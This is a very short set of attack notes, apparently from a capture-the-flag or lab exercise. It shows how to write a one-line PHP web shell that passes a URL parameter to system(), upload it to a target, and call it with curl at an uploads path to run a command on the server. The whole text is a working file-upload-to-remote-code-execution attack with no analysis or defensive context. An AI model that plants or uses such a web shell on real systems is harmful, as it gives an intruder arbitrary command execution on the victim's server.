```
nano shell.php

<?php system($_GET['cmd']) ?>
```
- upload this

```
curl http://10.129.202.133:3001/uploads/shell.php?cmd=hostname
```
